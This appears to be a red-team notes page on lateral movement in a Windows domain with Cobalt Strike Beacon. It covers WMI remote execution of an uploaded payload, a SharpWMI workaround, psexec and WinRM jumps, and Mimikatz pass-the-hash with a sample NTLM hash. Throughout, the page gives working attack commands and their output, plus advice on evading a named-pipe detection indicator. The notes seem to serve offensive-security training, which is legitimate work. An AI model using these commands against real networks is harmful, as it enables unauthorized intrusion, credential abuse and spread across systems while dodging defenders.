
## [[PowerShell Remoting]]
The most straight forward means of using this is to upload a payload to the target system and use WMI to execute it.
``````beacon
beacon> cd \\srv1\ADMIN$
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv1 C:\Windows\beacon-smb.exe
Started process 536 on srv1

beacon> link srv1
[+] established link to child beacon: 10.10.1.20
``````

## CoInitializeSecurity
Beacon's internal implementation of WMI uses a [Beacon Object File](https://cobaltstrike.com/help-beacon-object-files), executed using the [beacon_inline___execute](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics_aggressor-scripts/as-resources_functions.htm#beacon_inline_execute) Aggressor function. When a BOF is executed the [CoInitializeSecurity](https://docs.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-coinitializesecurity) COM object can be called, which is used to set the security context for the current process. According to Microsoft's documentation, this can only be called once per process.

The unfortunate consequence is that if you have CoInitializeSecurity get called in the context of, say "User A", then future BOFs may not be able to inherit a different security context ("User B") for the lifetime of the Beacon process.

An example of that can look like the following:
``````
beacon> make_token EDU\doe Passw0rd1
[+] Impersonated EDU\john

beacon> remote-exec wmi srv2 calc
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to srv2: 5
``````

As a workaround, your WMI execution needs to come from a different process. This can be achieved with commands such as `spawn` and `spawnas`, or even `execute-assembly` with a tool such as `SharpWMI`.

``````
beacon> remote-exec wmi srv2 calc
CoInitializeSecurity already called. Thread token (if there is one) may not get used
[-] Could not connect to srv2: 5

beacon> execute-assembly C:\Tools\SharpWMI\SharpWMI\bin\Debug\SharpWMI.exe action=exec computername=srv2 command="C:\Windows\System32\calc.exe"

[*] Host                           : srv2
[*] Command                        : C:\Windows\System32\calc.exe
[*] Creation of process returned   : 0
[*] Process ID                     : 1312
``````


## [[PsExec]]
The `psexec` / `psexec64` commands work by first uploading a service binary to the target system, then creating and starting a Windows service to execute that binary.  

The `psexec_psh` doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit).

Beacons executed this way run as SYSTEM.

``````beacon
beacon> jump psexec64 srv1 smb
Started service dd80980 on srv1
[+] established link to child beacon: 10.10.1.20
``````


## [[PowerShell Remoting]]
Get OS Architecture via WINRM and spawn a beacon with SMB listener
``````beacon
beacon> getuid
[*] You are EDU\john

beacon> remote-exec winrm srv1 (Get-WmiObject Win32_OperatingSystem).OSArchitecture
64-bit

beacon> jump winrm64 srv1 smb
[+] established link to child beacon: 10.10.1.20

``````


## [[Pass-the-Hash]]
### Recommended
To avoid the `\\.\pipe\` indicator, we can execute Mimikatz manually and specify our own process.

``````beacon
beacon> mimikatz sekurlsa::pth /user:doe /domain:edu.evil.corp /ntlm:4ffd3eabdce2e158d923ddec72de979e

user    : doe
domain    : edu.evil.corp
program    : cmd.exe
impers.    : no
NTLM    : 4ffd3eabdce2e158d923ddec72de979e
``````

### Not recommended
Beacon has a dedicated `pth` command which executes Mimikatz in the background.
``````beacon
beacon> pth EDU\doe 4ffd3eabdce2e158d923ddec72de979e

user    : doe
domain    : EDU
program    : C:\Windows\system32\cmd.exe /c echo 1cbe909fe8a > \\.\pipe\16ca6d
impers.    : no
NTLM    : 4ffd3eabdce2e158d923ddec72de979e
  |  PID  5540
  |  TID  5976
  |  LSA Process is now R/W
  |  LUID 0 ; 4069467 (00000000:003e185b)
  \_ msv1-0   - data copy @ 0000024DC099D3D0 : OK !
  \_ kerberos - data copy @ 0000024DC1673918
   \_ aes256_hmac       -> null             
   \_ aes128_hmac       -> null             
   \_ rc4_hmac_nt       OK
   \_ rc4_hmac_old      OK
   \_ rc4_md4           OK
   \_ rc4_hmac_nt_exp   OK
   \_ rc4_hmac_old_exp  OK
   \_ *Password replace @ 0000024DC14503D8 (32) -> null
``````

It passes the token over a named pipe which Beacon then impersonates automatically.
``````beacon
beacon> ls \\srv2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 dir     05/10/2022 04:11:30   $Recycle.Bin
 dir     05/10/2022 03:23:44   Boot
``````